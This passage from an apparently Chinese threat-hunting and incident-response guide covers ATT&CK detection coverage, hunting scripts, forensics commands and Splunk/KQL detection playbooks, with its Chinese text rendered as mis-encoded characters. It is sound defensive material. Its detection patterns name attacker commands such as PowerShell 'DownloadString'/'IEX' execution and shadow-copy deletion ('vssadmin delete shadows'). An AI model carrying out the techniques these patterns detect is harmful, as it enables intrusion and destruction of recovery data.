<div class="table-wrapper"><table><thead><tr><th>ATT&amp;CKæˆ˜æœ¯</th><th>å…³é”®æŠ€æœ¯</th><th>æ•°æ®æº</th><th>è¦†ç›–è§„åˆ™åç§°</th><th>å‘Šè­¦å½’ç±»</th></tr></thead><tbody>
<tr><td>Initial Access</td><td>T1566 é’“é±¼</td><td>é‚®ä»¶ç½‘å…³ã€ä»£ç†æ—¥å¿—</td><td><code>Email_Phish_Click</code>, <code>Proxy_Suspicious_URL</code></td><td>é«˜å±-ç¤¾ä¼šå·¥ç¨‹</td></tr>
<tr><td>Execution</td><td>T1059 PowerShell</td><td>Windowsäº‹ä»¶4104/4688</td><td><code>PS_EncodedCommand</code>, <code>PS_DownloadString</code></td><td>é«˜å±-è„šæœ¬æ‰§è¡Œ</td></tr>
<tr><td>Persistence</td><td>T1547 å¯åŠ¨é¡¹</td><td>Sysmon 13ã€æ³¨å†Œè¡¨å®¡æ ¸</td><td><code>Registry_Run_Add</code>, <code>ScheduledTask_Create</code></td><td>ä¸­å±-æŒä¹…åŒ–</td></tr>
<tr><td>Credential Access</td><td>T1003 å‡­è¯è½¬å‚¨</td><td>Sysmon 10/4688</td><td><code>Credential_Dump_Tool</code>, <code>LSASS_Access</code></td><td>è‡´å‘½-å‡­è¯çªƒå–</td></tr>
<tr><td>Lateral Movement</td><td>T1021 è¿œç¨‹æœåŠ¡</td><td>4624ã€ç½‘ç»œæµé‡</td><td><code>RDP_MultiHost</code>, <code>SMB_PTH</code></td><td>é«˜å±-æ¨ªå‘ç§»åŠ¨</td></tr>
<tr><td>Command &amp; Control</td><td>T1071 åº”ç”¨å±‚åè®®</td><td>Zeekã€ä»£ç†æ—¥å¿—</td><td><code>C2_Suspicious_DNS</code>, <code>Beaconing_HTTP</code></td><td>é«˜å±-è¿œç¨‹æ§åˆ¶</td></tr>
<tr><td>Exfiltration</td><td>T1041 C2é€šé“</td><td>æµé‡åˆ†æã€ä»£ç†æ—¥å¿—</td><td><code>Data_Over_HTTPs</code>, <code>Large_Upload</code></td><td>è‡´å‘½-æ•°æ®æ³„éœ²</td></tr>
</tbody></table>
</div>
<blockquote>
<p>ç›®æ ‡ï¼šATT&amp;CKæˆ˜æœ¯è¦†ç›–ç‡â‰¥80%ï¼Œæ ¸å¿ƒæŠ€æœ¯è¦†ç›–ç‡â‰¥70%ï¼Œå…³é”®èµ„äº§æ£€æµ‹å“åº”æ—¶é—´&lt;15åˆ†é’Ÿï¼›æ¯å­£åº¦æ»šåŠ¨è¯„ä¼°æå‡10%ã€‚</p>
</blockquote>
<h3 id="32-å¨èƒç‹©çŒthreat-hunting"><a class="header" href="#32-å¨èƒç‹©çŒthreat-hunting">3.2 å¨èƒç‹©çŒï¼ˆThreat Huntingï¼‰</a></h3>
<h4 id="å‡è®¾é©±åŠ¨ç‹©çŒ"><a class="header" href="#å‡è®¾é©±åŠ¨ç‹©çŒ">å‡è®¾é©±åŠ¨ç‹©çŒ</a></h4>
<p><strong>ç‹©çŒå‡è®¾åˆ¶å®š</strong>:</p>
<pre><code>å‡è®¾1: æ”»å‡»è€…å¯èƒ½ä½¿ç”¨PowerShellè¿›è¡Œå†…å­˜æ‰§è¡Œ
è¯æ®:
- EventID 4104 (PowerShellè„šæœ¬å—æ—¥å¿—)
- Base64ç¼–ç å‘½ä»¤
- DownloadStringæ–¹æ³•è°ƒç”¨

å‡è®¾2: æ”»å‡»è€…å¯èƒ½é€šè¿‡RDPæ¨ªå‘ç§»åŠ¨
è¯æ®:
- EventID 4624 LogonType=10 (è¿œç¨‹äº¤äº’ç™»å½•)
- çŸ­æ—¶é—´å†…å¤šæ¬¡RDPç™»å½•
- éåŠå…¬æ—¶é—´RDPè¿æ¥

å‡è®¾3: æ”»å‡»è€…å¯èƒ½ä½¿ç”¨Pass-the-Hash
è¯æ®:
- EventID 4624 LogonType=3 (ç½‘ç»œç™»å½•)
- NTLMè®¤è¯
- å¤šä¸ªä¸»æœºä½¿ç”¨ç›¸åŒå“ˆå¸Œç™»å½•
</code></pre>
<p><strong>ç‹©çŒæŸ¥è¯¢ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python"># å¨èƒç‹©çŒè‡ªåŠ¨åŒ–è„šæœ¬
import pandas as pd
from elasticsearch import Elasticsearch

class ThreatHunter:
    def __init__(self, es_host):
        self.es = Elasticsearch([es_host])

    def hunt_powershell_obfuscation(self):
        """
        ç‹©çŒPowerShellæ··æ·†
        """
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"winlog.event_id": "4104"}},
                        {"query_string": {
                            "query": "ScriptBlockText:(*-enc* OR *FromBase64String* OR *IEX*)"
                        }}
                    ]
                }
            },
            "size": 1000
        }

        results = self.es.search(index="security-logs-*", body=query)
        return self.analyze_results(results)

    def hunt_lateral_movement(self):
        """
        ç‹©çŒæ¨ªå‘ç§»åŠ¨
        """
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"winlog.event_id": "4624"}},
                        {"match": {"winlog.event_data.LogonType": "3"}}
                    ]
                }
            },
            "aggs": {
                "by_user": {
                    "terms": {"field": "winlog.event_data.TargetUserName"},
                    "aggs": {
                        "unique_sources": {
                            "cardinality": {"field": "winlog.event_data.IpAddress"}
                        }
                    }
                }
            }
        }

        results = self.es.search(index="security-logs-*", body=query)

        # åˆ†æï¼šåŒä¸€ç”¨æˆ·ä»å¤šä¸ªIPç™»å½•å¯èƒ½æ˜¯æ¨ªå‘ç§»åŠ¨
        suspicious_users = []
        for bucket in results['aggregations']['by_user']['buckets']:
            if bucket['unique_sources']['value'] &gt; 10:
                suspicious_users.append({
                    'user': bucket['key'],
                    'unique_ips': bucket['unique_sources']['value']
                })

        return suspicious_users

    def hunt_persistence(self):
        """
        ç‹©çŒæŒä¹…åŒ–æœºåˆ¶
        """
        persistence_indicators = [
            # æ³¨å†Œè¡¨Runé”®
            {"match": {"winlog.event_id": "4657"}},  # æ³¨å†Œè¡¨ä¿®æ”¹
            {"query_string": {"query": "ObjectName:(*\\Run OR *\\RunOnce)"}},

            # è®¡åˆ’ä»»åŠ¡
            {"match": {"winlog.event_id": "4698"}},  # è®¡åˆ’ä»»åŠ¡åˆ›å»º

            # æœåŠ¡åˆ›å»º
            {"match": {"winlog.event_id": "7045"}},  # æœåŠ¡å®‰è£…

            # WMIäº‹ä»¶è®¢é˜…
            {"query_string": {"query": "EventConsumer OR EventFilter"}}
        ]

        results = []
        for indicator in persistence_indicators:
            query = {"query": {"bool": {"must": [indicator]}}}
            result = self.es.search(index="security-logs-*", body=query)
            results.append(result)

        return results

    def generate_hunt_report(self):
        """
        ç”Ÿæˆç‹©çŒæŠ¥å‘Š
        """
        report = {
            'timestamp': datetime.now(),
            'findings': {
                'powershell_obfuscation': self.hunt_powershell_obfuscation(),
                'lateral_movement': self.hunt_lateral_movement(),
                'persistence': self.hunt_persistence()
            }
        }

        # ç”ŸæˆHTMLæŠ¥å‘Š
        html_report = f"""
        &lt;html&gt;
        &lt;head&gt;&lt;title&gt;å¨èƒç‹©çŒæŠ¥å‘Š&lt;/title&gt;&lt;/head&gt;
        &lt;body&gt;
            &lt;h1&gt;å¨èƒç‹©çŒæŠ¥å‘Š&lt;/h1&gt;
            &lt;p&gt;ç”Ÿæˆæ—¶é—´: {report['timestamp']}&lt;/p&gt;

            &lt;h2&gt;PowerShellæ··æ·†æ£€æµ‹&lt;/h2&gt;
            &lt;table&gt;
                &lt;tr&gt;&lt;th&gt;ä¸»æœº&lt;/th&gt;&lt;th&gt;ç”¨æˆ·&lt;/th&gt;&lt;th&gt;å‘½ä»¤&lt;/th&gt;&lt;/tr&gt;
                {self._generate_table_rows(report['findings']['powershell_obfuscation'])}
            &lt;/table&gt;

            &lt;h2&gt;æ¨ªå‘ç§»åŠ¨æ£€æµ‹&lt;/h2&gt;
            &lt;table&gt;
                &lt;tr&gt;&lt;th&gt;ç”¨æˆ·&lt;/th&gt;&lt;th&gt;å”¯ä¸€IPæ•°é‡&lt;/th&gt;&lt;/tr&gt;
                {self._generate_table_rows(report['findings']['lateral_movement'])}
            &lt;/table&gt;
        &lt;/body&gt;
        &lt;/html&gt;
        """

        return html_report
</code></pre>
<h3 id="33-åº”æ€¥å“åº”"><a class="header" href="#33-åº”æ€¥å“åº”">3.3 åº”æ€¥å“åº”</a></h3>
<h4 id="äº‹ä»¶å“åº”æµç¨‹"><a class="header" href="#äº‹ä»¶å“åº”æµç¨‹">äº‹ä»¶å“åº”æµç¨‹</a></h4>
<p><strong>NIST SP 800-61å“åº”æ¡†æ¶</strong>:</p>
<pre><code>1. å‡†å¤‡ (Preparation)
   â”œâ”€â”€ å»ºç«‹å“åº”å›¢é˜Ÿ
   â”œâ”€â”€ åˆ¶å®šå“åº”è®¡åˆ’
   â”œâ”€â”€ é…ç½®ç›‘æ§å·¥å…·
   â””â”€â”€ å‡†å¤‡å–è¯å·¥å…·

2. æ£€æµ‹ä¸åˆ†æ (Detection &amp; Analysis)
   â”œâ”€â”€ å‘Šè­¦æ¥æ”¶
   â”œâ”€â”€ åˆæ­¥åˆ†ç±»
   â”œâ”€â”€ æ·±åº¦åˆ†æ
   â””â”€â”€ èŒƒå›´ç¡®å®š

3. éåˆ¶ã€æ ¹é™¤ä¸æ¢å¤ (Containment, Eradication &amp; Recovery)
   â”œâ”€â”€ çŸ­æœŸéåˆ¶ï¼ˆéš”ç¦»å—æ„ŸæŸ“ç³»ç»Ÿï¼‰
   â”œâ”€â”€ é•¿æœŸéåˆ¶ï¼ˆæ‰“è¡¥ä¸ã€åŠ å›ºï¼‰
   â”œâ”€â”€ æ ¹é™¤å¨èƒ
   â””â”€â”€ ç³»ç»Ÿæ¢å¤

4. äº‹åæ´»åŠ¨ (Post-Incident Activity)
   â”œâ”€â”€ ç»éªŒæ•™è®­æ€»ç»“
   â”œâ”€â”€ è¯æ®ä¿ç•™
   â”œâ”€â”€ æµç¨‹æ”¹è¿›
   â””â”€â”€ åŸ¹è®­æ›´æ–°
</code></pre>
<p><strong>åº”æ€¥å“åº”Playbook</strong>:</p>
<pre><code class="language-yaml"># Ransomwareå“åº”Playbook
name: "å‹’ç´¢è½¯ä»¶åº”æ€¥å“åº”"
severity: critical
triggers:
  - æ£€æµ‹åˆ°æ–‡ä»¶æ‰¹é‡åŠ å¯†
  - å‘ç°å‹’ç´¢ä¿¡
  - å¼‚å¸¸åŠ å¯†è¿›ç¨‹

æ­¥éª¤:
  1_åˆå§‹å“åº”:
    - æ—¶é™: 15åˆ†é’Ÿ
    - æ“ä½œ:
      - éš”ç¦»å—æ„ŸæŸ“ä¸»æœºï¼ˆæ–­ç½‘ä½†ä¸å…³æœºï¼‰
      - é€šçŸ¥å®‰å…¨å›¢é˜Ÿå’Œç®¡ç†å±‚
      - è®°å½•åˆå§‹æ—¶é—´çº¿
    - è´Ÿè´£äºº: SOCå€¼ç­äººå‘˜

  2_éåˆ¶:
    - æ—¶é™: 1å°æ—¶
    - æ“ä½œ:
      - è¯†åˆ«æ„ŸæŸ“èŒƒå›´
      - éš”ç¦»æ‰€æœ‰å—å½±å“ç³»ç»Ÿ
      - ç¦ç”¨å¯ç–‘è´¦æˆ·
      - é˜»æ–­C2é€šä¿¡ï¼ˆé˜²ç«å¢™è§„åˆ™ï¼‰
    - è´Ÿè´£äºº: å®‰å…¨å·¥ç¨‹å¸ˆ

  3_è°ƒæŸ¥:
    - æ—¶é™: 4å°æ—¶
    - æ“ä½œ:
      - å†…å­˜å–è¯ï¼ˆæ•è·RAMï¼‰
      - ç£ç›˜é•œåƒ
      - ç½‘ç»œæµé‡åˆ†æ
      - æ—¥å¿—åˆ†æï¼ˆæŸ¥æ‰¾åˆå§‹å…¥ä¾µç‚¹ï¼‰
      - æ¶æ„è½¯ä»¶æ ·æœ¬æå–
    - è´Ÿè´£äºº: å–è¯åˆ†æå¸ˆ

  4_æ ¹é™¤:
    - æ—¶é™: 24å°æ—¶
    - æ“ä½œ:
      - åˆ é™¤æ¶æ„è½¯ä»¶
      - é‡ç½®è¢«ç›—å‡­è¯
      - ä¿®è¡¥æ¼æ´
      - æ¸…ç†æŒä¹…åŒ–æœºåˆ¶
    - è´Ÿè´£äºº: ç³»ç»Ÿç®¡ç†å‘˜

  5_æ¢å¤:
    - æ—¶é™: 72å°æ—¶
    - æ“ä½œ:
      - ä»å¤‡ä»½æ¢å¤æ•°æ®
      - é‡å»ºå—æ„ŸæŸ“ç³»ç»Ÿ
      - éªŒè¯ç³»ç»Ÿå®Œæ•´æ€§
      - é€æ­¥æ¢å¤ä¸šåŠ¡
    - è´Ÿè´£äºº: ITè¿ç»´å›¢é˜Ÿ

  6_å¤ç›˜:
    - æ—¶é™: 1å‘¨å
    - æ“ä½œ:
      - ç¼–å†™äº‹ä»¶æŠ¥å‘Š
      - åˆ†ææ ¹æœ¬åŸå› 
      - æ›´æ–°é˜²å¾¡ç­–ç•¥
      - å›¢é˜ŸåŸ¹è®­
    - è´Ÿè´£äºº: CISO
</code></pre>
<h4 id="æ•°å­—å–è¯"><a class="header" href="#æ•°å­—å–è¯">æ•°å­—å–è¯</a></h4>
<p><strong>å†…å­˜å–è¯</strong>:</p>
<pre><code class="language-bash"># Volatilityå†…å­˜åˆ†ææ¡†æ¶

# 1. è·å–å†…å­˜é•œåƒ
# Windows
FTK Imager (GUIå·¥å…·)
winpmem_mini_x64.exe memdump.raw

# Linux
sudo dd if=/dev/mem of=/tmp/memory.dump
# æˆ–ä½¿ç”¨LiME
sudo insmod lime.ko "path=/tmp/memory.lime format=lime"

# 2. ç¡®å®šå†…å­˜é…ç½®æ–‡ä»¶
volatility -f memdump.raw imageinfo

# 3. è¿›ç¨‹åˆ†æ
# åˆ—å‡ºè¿›ç¨‹
volatility -f memdump.raw --profile=Win10x64_19041 pslist
volatility -f memdump.raw --profile=Win10x64_19041 pstree

# æ£€æµ‹éšè—è¿›ç¨‹
volatility -f memdump.raw --profile=Win10x64_19041 psxview

# 4. ç½‘ç»œè¿æ¥åˆ†æ
volatility -f memdump.raw --profile=Win10x64_19041 netscan
volatility -f memdump.raw --profile=Win10x64_19041 connscan

# 5. æ¶æ„ä»£ç æ£€æµ‹
# æ£€æµ‹æ³¨å…¥
volatility -f memdump.raw --profile=Win10x64_19041 malfind
volatility -f memdump.raw --profile=Win10x64_19041 hollowfind

# æå–å¯ç–‘è¿›ç¨‹
volatility -f memdump.raw --profile=Win10x64_19041 procdump -p 1234 -D output/

# 6. æ³¨å†Œè¡¨åˆ†æ
volatility -f memdump.raw --profile=Win10x64_19041 hivelist
volatility -f memdump.raw --profile=Win10x64_19041 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"

# 7. æ—¶é—´çº¿åˆ†æ
volatility -f memdump.raw --profile=Win10x64_19041 timeliner --output=body &gt; timeline.body
mactime -b timeline.body -d &gt; timeline.csv

# 8. å‘½ä»¤å†å²
volatility -f memdump.raw --profile=Win10x64_19041 cmdscan
volatility -f memdump.raw --profile=Win10x64_19041 consoles
</code></pre>
<p><strong>ç£ç›˜å–è¯</strong>:</p>
<pre><code class="language-bash"># Autopsyå–è¯æ¡†æ¶

# 1. ç£ç›˜é•œåƒè·å–
# ä½¿ç”¨FTK Imageræˆ–dd
sudo dd if=/dev/sda of=/mnt/evidence/disk.img bs=4M status=progress

# è®¡ç®—å“ˆå¸Œå€¼ï¼ˆè¯æ®å®Œæ•´æ€§ï¼‰
md5sum disk.img &gt; disk.img.md5
sha256sum disk.img &gt; disk.img.sha256

# 2. æŒ‚è½½é•œåƒï¼ˆåªè¯»ï¼‰
sudo mount -o ro,loop disk.img /mnt/forensics

# 3. æ–‡ä»¶ç³»ç»Ÿåˆ†æ
# ä½¿ç”¨Sleuth Kit
fls -r disk.img

# æŸ¥æ‰¾å·²åˆ é™¤æ–‡ä»¶
fls -rd disk.img

# æ¢å¤å·²åˆ é™¤æ–‡ä»¶
icat disk.img [inode] &gt; recovered_file

# 4. æ—¶é—´çº¿åˆ†æ
fls -m / -r disk.img &gt; bodyfile
mactime -b bodyfile -d &gt; timeline.csv

# 5. æ–‡ä»¶ç­¾ååˆ†æ
# æ£€æµ‹æ–‡ä»¶ç±»å‹ä¼ªè£…
file * | grep -v "ASCII text"

# 6. å…³é”®è¯æœç´¢
grep -r "password" /mnt/forensics/
grep -r "confidential" /mnt/forensics/

# 7. æµè§ˆå™¨å–è¯
# Chromeå†å²
sqlite3 /mnt/forensics/Users/*/AppData/Local/Google/Chrome/User\ Data/Default/History \
  "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100;"

# Firefoxå†å²
sqlite3 /mnt/forensics/Users/*/AppData/Roaming/Mozilla/Firefox/Profiles/*/places.sqlite \
  "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100;"
</code></pre>
<h3 id="34-è“é˜Ÿæ£€æµ‹å‰§æœ¬åº“detection-playbooks"><a class="header" href="#34-è“é˜Ÿæ£€æµ‹å‰§æœ¬åº“detection-playbooks">3.4 è“é˜Ÿæ£€æµ‹å‰§æœ¬åº“ï¼ˆDetection Playbooksï¼‰</a></h3>
<h4 id="åŠ‡æœ¬-bt-001powershell-æ¶æ„æ‰§è¡Œæ£€æµ‹"><a class="header" href="#åŠ‡æœ¬-bt-001powershell-æ¶æ„æ‰§è¡Œæ£€æµ‹">åŠ‡æœ¬ #BT-001ï¼šPowerShell æ¶æ„æ‰§è¡Œæ£€æµ‹</a></h4>
<div class="table-wrapper"><table><thead><tr><th>æ­¥éª¤</th><th>æ“ä½œ</th><th>è¯´æ˜</th></tr></thead><tbody>
<tr><td>æ•°æ®æºç¡®è®¤</td><td>å¯ç”¨PowerShell ScriptBlockæ—¥å¿—(4104)ã€æ¨¡å—æ—¥å¿—(4103)ã€Sysmon(1,7)</td><td>éœ€ä¸‹å‘ç»„ç­–ç•¥å¹¶éªŒè¯æˆåŠŸ</td></tr>
<tr><td>åŸºçº¿å­¦ä¹ </td><td>ç»Ÿè®¡<code>CommandLine</code>å¸¸è§æ¨¡å¼ã€ç³»ç»Ÿè´¦å·</td><td>ä½¿ç”¨KQL/Splunk baselineåˆ†æ</td></tr>
<tr><td>è§„åˆ™ç¼–å†™</td><td>Sigmaï¼š<code>title: suspicious powershell encoded command</code></td><td>åŒ…å«<code>-enc</code>ã€<code>FromBase64String</code>ã€<code>downloadstring</code>ç­‰å…³é”®å­—</td></tr>
<tr><td>SOARå‰§æœ¬</td><td>è§¦å‘åè‡ªåŠ¨æ”¶é›†<code>Get-Process</code>, <code>Get-Service</code>, <code>Get-WinEvent</code></td><td>ç»“åˆEDR APIæ‰§è¡Œéš”ç¦»</td></tr>
<tr><td>å¤æµ‹</td><td>ä½¿ç”¨Invoke-Obfuscationç”Ÿæˆæ ·æœ¬å‘½ä»¤</td><td>ä¸çº¢é˜ŸååŒè¿›è¡ŒéªŒè¯</td></tr>
</tbody></table>
</div>
<p><strong>Splunkæ£€æµ‹æŸ¥è¯¢</strong>ï¼š</p>
<pre><code>index=security winlog.channel=Microsoft-Windows-PowerShell/Operational EventCode=4104
| stats values(ScriptBlockText) as script, min(_time) as first_seen by Computer, UserID
| search script="*FromBase64String*" OR script="*IEX*"
</code></pre>
<p><strong>KQLæ£€æµ‹æŸ¥è¯¢ï¼ˆDefender for Endpointï¼‰</strong>ï¼š</p>
<pre><code>DeviceEvents
| where ActionType == "PowerShellCommand" and Timestamp &gt; ago(1d)
| extend CommandLine = tostring(AdditionalFields["CommandLine"])
| where CommandLine has_any ("-enc", "FromBase64String", "DownloadString")
| summarize count(), make_set(CommandLine) by DeviceName, InitiatingProcessAccountName
</code></pre>
<h4 id="åŠ‡æœ¬-bt-002æ¨ªå‘ç§»åŠ¨-pass-the-hash"><a class="header" href="#åŠ‡æœ¬-bt-002æ¨ªå‘ç§»åŠ¨-pass-the-hash">åŠ‡æœ¬ #BT-002ï¼šæ¨ªå‘ç§»åŠ¨ (Pass-the-Hash)</a></h4>
<div class="table-wrapper"><table><thead><tr><th>æ­¥éª¤</th><th>æ“ä½œ</th><th>è¯´æ˜</th></tr></thead><tbody>
<tr><td>æ•°æ®æº</td><td>Windowså®‰å…¨æ—¥å¿—(4624/4625/4648)ã€Sysmon 10ã€EDRè®¤è¯æ—¥å¿—</td><td>éœ€ä¿ç•™å®Œæ•´ç™»å½•äº‹ä»¶</td></tr>
<tr><td>è§„åˆ™è®¾è®¡</td><td>è¯†åˆ«çŸ­æ—¶é—´å†…åŒä¸€è´¦æˆ·ä»ä¸åŒIPç™»å½•ã€NTLMè®¤è¯</td><td>å»ºç«‹ç™½åå•ï¼ˆè¿ç»´è·³æ¿ï¼‰</td></tr>
<tr><td>æŸ¥è¯¢ç¤ºä¾‹</td><td><code>4624 LogonType=3</code> + åŒä¸€<code>TargetUserName</code>å¤šæºIP</td><td>ç»“åˆZeek SMBæ—¥å¿—ä½è¯</td></tr>
<tr><td>å“åº”åŠ¨ä½œ</td><td>å»ºè®®è‡ªåŠ¨è§¦å‘ï¼šå†»ç»“è´¦å·ã€è®°å½•å“ˆå¸Œã€é€šçŸ¥å€¼ç­</td><td>éœ€ä¸è´¦å·ç®¡ç†æµç¨‹è”åŠ¨</td></tr>
</tbody></table>
</div>
<pre><code>index=security sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=3 Authentication_Package=NTLM
| stats dc(Source_Network_Address) as src_cnt, values(Source_Network_Address) as srcs by Target_User_Name, _time span=15m
| where src_cnt &gt;= 3
</code></pre>
<h4 id="åŠ‡æœ¬-bt-003æ•°æ®æ¸—å‡ºæ£€æµ‹"><a class="header" href="#åŠ‡æœ¬-bt-003æ•°æ®æ¸—å‡ºæ£€æµ‹">åŠ‡æœ¬ #BT-003ï¼šæ•°æ®æ¸—å‡ºæ£€æµ‹</a></h4>
<p>| æ•°æ®æº | Proxy/Firewallæ—¥å¿—ã€Zeekã€DNSæ—¥å¿— |
| æŒ‡æ ‡ | å‡ºå£æµé‡å¤§å°ã€ä¼šè¯æŒç»­æ—¶é—´ã€åŸŸåç†µå€¼ |
| æŸ¥è¯¢ | <code>where bytes_out &gt; 10000000 and dest_port in (443,8080) and not dest_domain in whitelist</code> |
| å“åº” | è‡ªåŠ¨é˜»æ–­ã€é€šçŸ¥ç½‘ç»œå›¢é˜Ÿã€è§¦å‘å–è¯é‡‡é›† |</p>
<p><strong>Zeekè„šæœ¬ç‰‡æ®µ</strong>ï¼š</p>
<pre><code class="language-zeek">redef Notice::policy += {
    [$pred(n: Notice::Info) =
        n$note == Notice::HTTP::Large-Upload,
        $actions = Notice::ACTION_EMAIL]
};
</code></pre>
<h4 id="åŠ‡æœ¬-bt-004å‹’ç´¢è½¯ä»¶åˆæœŸæ£€æµ‹"><a class="header" href="#åŠ‡æœ¬-bt-004å‹’ç´¢è½¯ä»¶åˆæœŸæ£€æµ‹">åŠ‡æœ¬ #BT-004ï¼šå‹’ç´¢è½¯ä»¶åˆæœŸæ£€æµ‹</a></h4>
<ul>
<li><strong>è¡Œä¸ºç‰¹å¾</strong>ï¼šçŸ­æ—¶é—´å†…å¤§é‡æ–‡ä»¶è¢«ä¿®æ”¹ã€åˆ›å»ºå¯ç–‘è¿›ç¨‹ã€å‡ºç°åŠ å¯†åç¼€ã€‚</li>
<li><strong>æ£€æµ‹æ‰‹æ®µ</strong>ï¼š
<ul>
<li>æ–‡ä»¶å®¡è®¡ï¼šä½¿ç”¨FSRMæˆ–EDRç›‘æ§<code>*.locked</code>ã€<code>*.encrypted</code>ç­‰åç¼€ã€‚</li>
<li>è¿›ç¨‹è¡Œä¸ºï¼šæŸ¥<code>vssadmin delete shadows</code>ã€<code>wmic shadowcopy delete</code>ã€‚</li>
<li>ç½‘ç»œè¡Œä¸ºï¼šéšæœºå­åŸŸã€Torå‡ºå£ã€æ¯”ç‰¹å¸åœ°å€ã€‚</li>
</ul>
</li>
<li><strong>KQLç¤ºä¾‹</strong>ï¼š</li>
</ul>
<pre><code>DeviceFileEvents
| where Timestamp &gt; ago(1h)
| where ActionType == "FileRenamed" and FileName endswith ".locked"
| summarize count() by DeviceName, InitiatingProcessFileName
| where count_ &gt; 500
</code></pre>
<ul>
<li><strong>å“åº”åŠ¨ä½œ</strong>ï¼š
<ol>
<li>è‡ªåŠ¨éš”ç¦»ç»ˆç«¯ï¼›</li>
<li>é˜»æ–­å¯ç–‘C2åŸŸå/IPï¼›</li>
<li>è§¦å‘å–è¯é‡‡é›†ï¼ˆå†…å­˜ã€ç£ç›˜ã€æ—¥å¿—ï¼‰ï¼›</li>
<li>é€šè¿‡SOARåˆ›å»ºå·¥å•å¹¶é€šçŸ¥ä¸šåŠ¡ã€‚</li>
</ol>
</li>
</ul>
<h3 id="35-å¨èƒç‹©çŒæ¡ˆä¾‹ç ”ç©¶"><a class="header" href="#35-å¨èƒç‹©çŒæ¡ˆä¾‹ç ”ç©¶">3.5 å¨èƒç‹©çŒæ¡ˆä¾‹ç ”ç©¶</a></h3>
<h4 id="æ¡ˆä¾‹ä¸€éšè”½çš„cobalt-strike-beacon"><a class="header" href="#æ¡ˆä¾‹ä¸€éšè”½çš„cobalt-strike-beacon">æ¡ˆä¾‹ä¸€ï¼šéšè”½çš„Cobalt Strike Beacon</a></h4>
<ol>
<li><strong>å‡è®¾</strong>ï¼šæ”»å‡»è€…ä½¿ç”¨HTTP beaconï¼Œé—´éš”ä¸º60sï¼ŒUser-Agentä¼ªè£…ã€‚</li>
<li><strong>æ•°æ®å‡†å¤‡</strong>ï¼šæŠ“å–ä»£ç†æ—¥å¿—ã€Zeek http.logã€‚</li>
<li><strong>åˆ†ææ­¥éª¤</strong>ï¼š
<ul>
<li>è®¡ç®—æ¯ä¸ªæºIPçš„è¯·æ±‚é—´éš”æ–¹å·®ï¼›</li>
<li>ç­›é€‰Pathé•¿åº¦å›ºå®šã€çŠ¶æ€ç 200/204çš„è¯·æ±‚ï¼›</li>
<li>ä½¿ç”¨ç†µç®—æ³•è¯†åˆ«Cookie/URIå¼‚å¸¸ã€‚</li>
</ul>
</li>
<li><strong>è„šæœ¬ç¤ºä¾‹ï¼ˆPythonï¼‰</strong>ï¼š</li>
</ol>
<pre><code class="language-python">import pandas as pd

def detect_beacon(log_file):
    df = pd.read_csv(log_file)
    df['timestamp'] = pd.to_datetime(df['timestamp'])
    result = []
    for (src, dest), group in df.groupby(['src_ip', 'dest_ip']):
        group = group.sort_values('timestamp')
        interval = group['timestamp'].diff().dt.total_seconds().dropna()
        if len(interval) &gt;= 5 and interval.std() &lt; 5:
            result.append({'src': src, 'dest': dest, 'mean_interval': interval.mean()})
    return pd.DataFrame(result)
</code></pre>
<ol start="5">
<li><strong>è¾“å‡º</strong>ï¼šå¯ç–‘IPåˆ—è¡¨ã€è¯·æ±‚ç‰¹å¾ã€æ—¥å¿—æ ·æœ¬ï¼Œæäº¤ç»™SOCè¿›ä¸€æ­¥åˆ†æã€‚</li>
</ol>
<h4 id="æ¡ˆä¾‹äºŒå¯ç–‘æ¨ªå‘rdpé“¾è·¯"><a class="header" href="#æ¡ˆä¾‹äºŒå¯ç–‘æ¨ªå‘rdpé“¾è·¯">æ¡ˆä¾‹äºŒï¼šå¯ç–‘æ¨ªå‘RDPé“¾è·¯</a></h4>
<ul>
<li>ä½¿ç”¨ElasticæŸ¥è¯¢ï¼ˆEQLï¼‰å¯»æ‰¾1å°æ—¶å†…åŒä¸€è´¦æˆ·ä»å¤šä¸ªä¸»æœºå‘èµ·RDPï¼š</li>
</ul>
<pre><code>sequence by TargetUserName with maxspan=1h
  [ authentication where LogonType == "10" ]
  [ authentication where LogonType == "10" ]
</code></pre>
<ul>
<li>åˆ†æç™»å½•æºã€ç›®æ ‡ã€åœ°ç†ä½ç½®ï¼ŒåŒ¹é…å·¥ä½œæ—¶é—´è¡¨ã€‚</li>
<li>è¾“å‡ºç»“æœè¿›å…¥SOARï¼Œè‹¥å¼‚å¸¸åˆ™æ‰§è¡Œé”å®šè´¦æˆ·ã€‚</li>
</ul>
<hr />
<h2 id="æ¨¡å—å››ç´«é˜ŸååŒä¸æ”»é˜²èåˆ"><a class="header" href="#æ¨¡å—å››ç´«é˜ŸååŒä¸æ”»é˜²èåˆ">æ¨¡å—å››ï¼šç´«é˜ŸååŒä¸æ”»é˜²èåˆ</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆååŒè§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆååŒè§†è§’">æ¨¡å—æ€»è§ˆï¼ˆååŒè§†è§’ï¼‰</a></h3>
<ul>
<li><strong>å®šä½</strong>ï¼šè®©çº¢è“åŒæ–¹åœ¨å¯æ§èŠ‚å¥ä¸‹å…±äº«çŸ¥è¯†ã€éªŒè¯æ£€æµ‹ã€å¿«é€Ÿå…³é—­é˜²å¾¡ç¼ºå£ï¼Œå®ç°â€œæ”»é˜²åŒå‘å¥”èµ´â€ã€‚</li>
<li><strong>å…³é”®æˆæœ</strong>ï¼š
<ul>
<li>Purple Team Playbookï¼ˆæ­¥éª¤ã€è¾“å…¥ã€è¾“å‡ºã€åº¦é‡ï¼‰</li>
<li>æ”»é˜²è”åŠ¨çœ‹æ¿ï¼ˆæ¼”ç»ƒè¿›åº¦ã€æ£€æµ‹ç»“æœã€è¡ŒåŠ¨é¡¹ï¼‰</li>
<li>æ£€æµ‹éªŒè¯è®°å½•ï¼ˆDetection Validation Recordï¼‰ä¸æ”¹è¿›é¡¹è¿½è¸ª</li>
</ul>
</li>
<li><strong>åä½œå¾ªç¯</strong>ï¼šPlan â†’ Execute â†’ Detect â†’ Measure â†’ Improveã€‚</li>
</ul>
